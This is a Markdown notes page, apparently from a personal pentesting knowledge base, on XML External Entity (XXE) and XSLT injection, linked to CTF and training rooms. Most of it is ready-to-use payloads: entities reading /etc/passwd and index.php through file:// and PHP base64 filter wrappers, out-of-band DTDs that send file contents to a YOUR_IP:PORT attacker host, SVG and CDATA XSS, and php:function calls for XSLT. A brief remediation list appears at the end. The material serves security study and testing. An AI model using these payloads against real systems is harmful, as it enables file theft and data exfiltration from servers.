# XML External Entity (XXE)

[![owasptop10](../../../../_badges/thm/owasptop10.svg)](https://tryhackme.com/room/owasptop10)
[![mustacchio](../../../../_badges/thm-p/mustacchio.svg)](https://tryhackme.com/room/mustacchio)
[![xxe_injection](../../../../_badges/poat/xxe_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
[![web_attacks](../../../../_badges/htb/web_attacks.svg)](https://academy.hackthebox.com/course/preview/web-attacks)

<div class="row row-cols-lg-2"><div>

An XML External Entity (XXE) is an attack exploiting [XML](/programming-languages/others/data/xml.md) parsers used by applications. We create a custom [DTD](/programming-languages/others/data/xml.md#document-type-definition-dtd-) doing something malicious.

* Arbitrary file access <small>(passwd, id_rsa, etc.)</small>
* Perform a DDoS attack <small>(often patched in modern web servers)</small>
* Perform a [SSRF attack](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md)
* Perform a [XSS attack](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md)

There are two kind of XXE

* **In-band**: same channel to attack and fetch results
* **Out of Band/Blind**: different channels to attack and fetch results
</div><div>

For instance, we define an entity called `poc` in the DTD that is defined by the string `Hello, World!`. A vulnerable XML parser will replace the anchor `&poc;` inside the root element with the string.

```xml!
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY poc "Hello, World!">]>
<root>&poc;</root>
```

‚ö†Ô∏è This is not the only PoC/sign of a possible XXE.

üìö As a reminder, [SVG](https://en.wikipedia.org/wiki/SVG) are XML files too.
</div></div>

<hr class="sep-both">

## XXE XML Payloads

<div class="row row-cols-lg-2"><div>

When using in-band XXE, inject the anchor in a tag that is displayed.

#### Stealing files

We can use the `file://` protocol to read simple files.

```xml!
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<root>&xxe;</root>
```

But it doesn't work when the file contains XML tags. We can use [PHP wrappers](/cybersecurity/red-team/s3.exploitation/vulns/web/files/wrappers.md) to read PHP and non PHP files on a PHP web server.

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root>&xxe;</root>
```

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

Alternatively, we can try to use CDATA, but due to some security protections in most XML parsers, you need to host the payload on your server to be allowed to merge XML parameter entities (`%`).

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://YOUR_IP:PORT/xxe.dtd"> %dtd;]>
<root>&xxe;</root>
```

And expose the following XML at `http://OUR_IP:PORT/xxe.dtd`:

```xml!
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % end "]]>">
<!ENTITY xxe "%begin;%file;%end;">
```
</div><div>

#### XSS attack

If the XML is displayed, you can try an XSS attack using CDATA.

```xml!
<?xml version="1.0"?>
<root><![CDATA[<script>console.log('test')</script>]]></root>
```

#### Out of Band XSS

If we cannot see any output, we may first try to see if we can see error messages <small>(missing/invalid tag, reference, etc.)</small> or connect to our server.

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://YOUR_IP:PORT/xxe.dtd"> %dtd;]>
<root>&xxe;</root>
```

And expose the following XML at `http://OUR_IP:PORT/xxe.dtd` if you can see error messages:

```xml!
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
%error;
```

Or expose the following XML at `http://OUR_IP:PORT/xxe.dtd`.

```xml!
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
<!ENTITY % oob "<!ENTITY &#x25; payload SYSTEM 'http://YOUR_IP:PORT/?payload=%file;'>">
%oob;
%payload;
```

üìö We could also try DNS exfiltration (`<payload>.example.com`).
</div></div>

<hr class="sep-both">

## XXE SVG Payloads

<div class="row row-cols-lg-2"><div>

#### Stealing files

We can use the `file://` protocol to read simple files. For a SVG, we can use the following code <small>(assuming `attr` is displayed)</small>:

```xml!
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
<attr>&xxe;</attr>
</svg>
```

But it doesn't work when the file contains XML tags. We can use [PHP wrappers](/cybersecurity/red-team/s3.exploitation/vulns/web/files/wrappers.md) to read PHP and non PHP files on a PHP web server.

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

```xml!
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
<attr>&xxe;</attr>
</svg>
```
</div><div>

#### XSS attack

If the SVG is displayed, we may be able to perform a XSS attack.

```xml!
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">/* ... */</script>
</svg>
```
</div></div>

<hr class="sep-both">

## XSLT Transformations

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![xslt_injection](../../../../_badges/poat/xslt_injection.svg)](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/)
[![xslt_ssi](../../../../_badges/hacktricks/xslt_ssi.svg)](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations)
[![xslt_code_execution](../../../../_badges/rootme/web_server/xslt_code_execution.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)

<div class="row row-cols-lg-2"><div>

Transformations may be applied on the XML, usually when transforming XML documents into HTML, another XML document, or PDF. If the XSLT parser is vulnerable, we may be able to execute code.

An example of a base template for a PHP XSLT wrapper:

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<!-- add some payload here -->
</body>
</html>
```
</div><div>

While common PHP payloads are:

```xml!
<xsl:value-of select="php:function('readfile','index.php')" />
<xsl:copy-of name="xxx" select="php:function('file_get_contents', 'index.php')">
<xsl:value-of select="php:function('opendir','.')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:copy-of name="xxx" select="php:function('assert', '1==1')" />
```

üìö Common XSLT parsers are: LibXSLT, Xalan, and Saxon.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `PUBLIC` instead of `SYSTEM`?

Word - CVE-2019-13358 (example)

```text!
unzip xxx.docx
nano word/document.xml
zip resume.docx word/document.xml
```

Tools

* [XXEinjector](https://github.com/enjoiz/XXEinjector) <small>(1.4k ‚≠ê, 2020 ü™¶)</small>
* [xxexploiter](https://github.com/luisfontes19/xxexploiter) <small>(0.5k ‚≠ê, 2022 ü™¶)</small>
</div><div>

Remediations

* Disallow external DTDs
* Disallow external entities
* Disallow XML parameters entities
* Disable XInclude
* Disable Self Reference/Entity Loops
</div></div>